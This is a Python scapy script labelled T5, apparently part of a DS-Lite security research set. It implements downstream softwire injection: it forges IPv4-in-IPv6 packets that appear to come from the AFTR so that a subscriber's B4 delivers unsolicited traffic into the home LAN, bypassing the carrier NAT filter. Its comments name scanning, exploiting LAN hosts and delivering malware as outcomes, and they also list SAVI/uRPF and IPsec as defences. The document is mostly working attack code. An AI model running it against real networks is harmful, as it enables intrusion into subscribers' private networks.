#!/usr/bin/python
# T5 - Downstream Softwire Injection (inbound dual of T3) into a subscriber LAN (P2, on-path carrier).
#
# DS-Lite mechanism exploited: the AFTR reaches a subscriber by encapsulating inbound
# IPv4 into an IPv4-in-IPv6 softwire toward that subscriber's B4 (RFC 6333). The B4
# decapsulates anything arriving from the AFTR's outer IPv6 address and forwards the
# inner IPv4 onto the customer LAN. RFC 6333 specifies no authentication on the softwire,
# so an on-path attacker on the IPv6 carrier segment (P2) that forges
#     IPv6(src = AFTR, dst = victim B4) / IPv4(src = anything, dst = LAN host) / payload
# has the B4 decapsulate it and deliver arbitrary, unsolicited inbound traffic straight
# into the subscriber LAN. The packet never traverses the AFTR, so it bypasses the
# carrier-grade NAT's stateful inbound filter entirely (no binding is required).
#
# This is the inbound dual of T3 (T3 forges B4 -> AFTR to impersonate a subscriber to the
# AFTR; T5 forges AFTR -> B4 to inject into the subscriber). Damage: scan and exploit LAN
# hosts that the CGN would otherwise shield, inject forged responses into live flows, or
# deliver malware, all from the carrier segment.
#
# Verified independently by: a capture on the victim B4 LAN interface showing the injected
# inner IPv4 arriving (and, for an ICMP echo probe, the LAN host replying), on a code path
# separate from this tool, with no matching binding present at the AFTR.
#
# Defense: source-address validation on the softwire (SAVI / uRPF, RFC 7039) so a packet
# bearing the AFTR's outer IPv6 source cannot be emitted from the attacker's access port;
# IPsec/ESP on the softwire authenticates the endpoint outright.
import argparse, sys, time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

try:
    from scapy.all import IPv6, IP, ICMP, UDP, Ether, sendp
except Exception as exc:                       # pragma: no cover
    print(f"[!] scapy required: {exc}"); sys.exit(2)

import subprocess


def _b4_mac(b4_ip6):
    """Resolve the victim B4's link-layer address from the local neighbour
    cache without triggering scapy's L3 NDP. On the carrier segment the
    attacker has usually already seen the B4, so a unicast frame is precise;
    if the entry is missing we fall back to L2 broadcast (the B4 still
    decapsulates on the outer destination IP, and an on-path attacker may
    legitimately broadcast onto the segment)."""
    try:
        out = subprocess.run(["ip", "-6", "neigh", "show", b4_ip6],
                             capture_output=True, text=True, timeout=3).stdout
        for tok in out.split():
            if ":" in tok and len(tok) == 17:   # aa:bb:cc:dd:ee:ff
                return tok
    except Exception:
        pass
    return "ff:ff:ff:ff:ff:ff"


def run(args):
    print(f"[*] T5 - Downstream Softwire Injection (inbound dual of T3) (vantage P2, on-path carrier)")
    print(f"[*] forging softwire packets: outer IPv6 {args.aftr} -> {args.b4}, "
          f"inner IPv4 {args.spoof_src} -> {args.lan_host}")
    inner = IP(src=args.spoof_src, dst=args.lan_host)
    if args.proto == "icmp":
        inner = inner / ICMP() / b"INJECTED-FROM-CARRIER"
    else:
        inner = inner / UDP(dport=args.dport) / b"INJECTED-FROM-CARRIER"
    # Send at L2 (sendp) rather than L3 (send). The forged outer source is the
    # AFTR address, which the attacker does not own, so the kernel's L3 path
    # cannot route a Neighbour Solicitation for the B4 and scapy stalls ~1 s per
    # packet before an unreliable broadcast fallback. Framing the Ethernet layer
    # ourselves and emitting on the carrier interface is deterministic and fast.
    dst_mac = _b4_mac(args.b4)
    pkt = Ether(dst=dst_mac) / IPv6(src=args.aftr, dst=args.b4) / inner
    print(f"[*] emitting on {args.iface} -> B4 L2 {dst_mac}")
    sendp(pkt, iface=args.iface, count=args.count, verbose=0)
    print(f"*** T5: {args.count} unsolicited inbound packet(s) injected into the LAN, "
          f"bypassing the AFTR CGN filter (verify on the B4 LAN capture) ***")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="T5 Downstream Softwire Injection (inbound dual of T3, P2)")
    ap.add_argument("--aftr", default="2001:db8:cafe::10", help="AFTR outer IPv6 to forge as source")
    ap.add_argument("--b4", default="2001:db8:cafe::b41", help="victim B4 outer IPv6 (softwire dst)")
    ap.add_argument("--lan-host", default="10.0.1.100", help="victim inner IPv4 (LAN host)")
    ap.add_argument("--spoof-src", default="203.0.113.66", help="forged inner source IPv4")
    ap.add_argument("--proto", choices=["icmp", "udp"], default="icmp")
    ap.add_argument("--dport", type=int, default=9999)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--iface", default="eth-isp", help="carrier interface to emit on")
    sys.exit(run(ap.parse_args()))
